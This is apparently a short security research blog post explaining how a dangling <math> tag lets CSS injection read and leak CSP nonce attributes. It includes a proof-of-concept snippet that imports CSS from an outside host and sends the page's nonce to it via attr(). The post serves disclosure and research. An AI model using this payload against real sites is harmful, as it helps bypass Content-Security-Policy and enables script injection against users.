---
layout: post
title: Leaking CSP nonces with CSS & MathML
author: Jorian Woltjer
date: 2025-10-05
tags: [csp, mathml, dangling-markup]
profile_picture: /assets/images/JW_Logo_V2_Transparant.webp
handle: j0r1an
social_links: [https://x.com/J0R1AN, https://jorianwoltjer.com/]

description: "By dangling a <math> tag in HTML, leaking nonce attributes via CSS is possible again!"
permalink: /research/leaking-csp-nonces-css-mathml
---

Nowadays, browsers prevent CSS Injection from being able to leak [`nonce=`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/nonce) attributes, *they can't be matched*. Either via selectors or the new [`attr()`](https://developer.mozilla.org/en-US/docs/Web/CSS/attr) function.

> **Tip**: In case you're testing this, made sure your testing setup has a CSP header active with the correct nonce. Only then will it hide the nonce attribute, otherwise you might get false positives!

The trick: if you can dangle a [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Reference/Element/math) tag at the end of your payload, and a script/style with a nonce comes right after it (before auto-closing the math tag), in the MathML namespace this protection isn't active!

That means you can match it with selectors like [`*=`](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors#attrvalue_6), or use the `attr()` trick just like any other attribute:

```html
Content-Security-Policy: script-src 'nonce-NONCE'

<style>
  @import 'https://r.jtw.sh./poc.css?body=*[nonce]+%7B%0D%0A++background%3A+image-set%28attr%28nonce%29%29%3B%0D%0A%7D';
</style>
<math>
  <script nonce="NONCE">
    console.log("Hello, world!");
  </script>
```

---

I don't think this is very useful in the real world yet because dangling markup really only happens on *server-side* HTML injection, while updating a payload to include our newly leaked nonce requires a *client-side* injection. Maybe someone has an attack scenario ¯\\\_(ツ)\_/¯
